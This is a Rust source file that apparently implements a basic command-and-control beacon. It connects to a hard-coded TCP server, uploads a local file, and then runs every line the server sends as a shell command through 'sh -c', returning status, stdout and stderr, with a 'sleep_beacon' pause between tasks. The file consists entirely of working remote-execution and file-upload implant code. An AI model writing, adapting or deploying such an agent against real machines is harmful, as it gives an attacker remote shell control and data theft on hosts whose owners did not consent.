use std::process::Command;
use std::io::BufReader;
use std::io::BufRead;
use std::io::BufWriter;
use std::io::Write;
use std::net::SocketAddr;
use std::{thread, time};
use std::net::{Shutdown, TcpStream};
use std::time::{Duration, Instant};
use std::fs::File;
use std::io::prelude::*;
use std::env;


const TIMEOUT:u64=60;
//use std::os::unix::net::SocketAddr;



struct Resultat{
    status: String,
    stdout: String,
    stderr: String,
}

fn create_resultat(status: String, stdout: String, stderr: String) -> Resultat{
    Resultat {
        status,
        stdout,
        stderr,
    }
}

fn duration_before_shutdown(stream: &mut TcpStream, time:u64) {
    stream.set_read_timeout(Some(Duration::new(TIMEOUT, 0))).expect("set_read_timeout call failed");
}
/* execute commands and returns results */
fn execute_commands(command: &str) -> Resultat {
    
    //  runs the program and returns the output
    let output = Command::new("sh")
                    .arg("-c")
                    .arg(command)
                    .output()
                    .expect("failed to execute process");
    let s = output.status.to_string();
    let o = String::from_utf8_lossy(&output.stdout).to_string();
    let e = String::from_utf8_lossy(&output.stderr).to_string();   
    let results = create_resultat(s, o, e);
    results
}


/* display the array result */
fn display_resultat(v: Vec<Resultat>){
    if v.is_empty(){
        println!("Il n'y a pas de resultat ");
    }else{
        for i in &v {
            println!("status: {}", i.status);
            println!("stdout: {}", i.stdout);
            println!("stderr: {}", i.stderr);
        }
    }

}


fn get_command(command: &str) -> String{
    let mut result = command.replace("command  ", "");
    let result = result.replace(" target", "");
    result
}


fn sleep_beacon(milli_second: u64){
    let ten_millis = time::Duration::from_millis(milli_second);
    let now = time::Instant::now();
    thread::sleep(ten_millis);
}

fn upload_file(stream: &mut TcpStream, path: &str) {
    let mut file = File::open(path).unwrap();
    
    let mut buf = [0; 4096];
    loop {
        let n = file.read(&mut buf).unwrap();
        
        if n == 0 {
            // reached end of file
            break;
        }
        
        stream.write_all(&buf[..n]).expect("Error writing in stream");
    }
    println!("File sent to server !");
}


fn main(){

    let addr = "127.0.0.1:3333";
    let mut stream = TcpStream::connect(addr).unwrap();
    println!("Server connecting on addr {}",addr);

    duration_before_shutdown(&mut stream, 60);
    upload_file(&mut stream, "src/uploadFile.txt");

    let mut reader = BufReader::new(&stream);
    let mut writer = &stream;
    let mut line = String::new();
    let exe_path = env::current_exe().expect("failed to ....");
    println!("{}", exe_path.display());
    let lines_server = reader.lines().fuse();
    for l in lines_server {
        line = l.unwrap();
        if line.contains("command") | line.contains("target"){

        }
        if line.contains("sleep"){
            println!("exectue sleep function");
            sleep_beacon(10000);
        }else{ 
            /*line.contains("command") | line.contains("target") {*/
            let mut response = String::from("response:");
            let command = get_command(line.trim()); // return the command input without "command" and "target"
            println!("command receive is : {}", command);
            let results = execute_commands(&command);
            println!("result of the command : {}", results.stdout);
            response.push_str(&results.status);
            response.push_str(" stdout : ");
            response.push_str(&results.stdout);
            response.push_str(" stderr : ");
            response.push_str(&results.stderr);
            println!("{}", response);
            writer.write_all(response.as_bytes()).unwrap();
            //list_result_command.push(results);
        }
    }
    

}

